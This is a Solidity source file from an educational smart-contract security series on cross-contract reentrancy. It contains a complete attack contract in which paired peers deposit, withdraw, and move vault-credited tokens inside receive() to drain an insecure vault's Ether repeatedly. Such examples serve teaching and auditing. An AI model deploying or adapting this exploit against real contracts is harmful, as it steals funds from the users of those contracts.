// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//-------------------------------------------------------------------------------------//
// Copyright (c) 2022 - 2023 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//-------------------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-05-cross-contract-reentrancy-30f29e2a01b9
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-05-cross-contract-reentrancy/

pragma solidity 0.8.17;

import "./Dependencies.sol";

interface IMoonVault {
    function deposit() external payable;
    function withdrawAll() external;
    function getUserBalance(address _user) external view returns (uint256);
}

contract Attack {
    IMoonToken public immutable moonToken;
    IMoonVault public immutable moonVault;
    Attack public attackPeer;

    constructor(IMoonToken _moonToken, IMoonVault _insecureMoonVault) {
        moonToken = _moonToken;
        moonVault = _insecureMoonVault;
    }

    function setAttackPeer(Attack _attackPeer) external {
        attackPeer = _attackPeer;
    }
    
    receive() external payable {
        if (address(moonVault).balance >= 1 ether) {
            moonToken.transfer(
                address(attackPeer), 
                moonVault.getUserBalance(address(this))
            );
        }
    }

    function attackInit() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        moonVault.deposit{value: 1 ether}();
        moonVault.withdrawAll();
    }
    
    function attackNext() external {
        moonVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}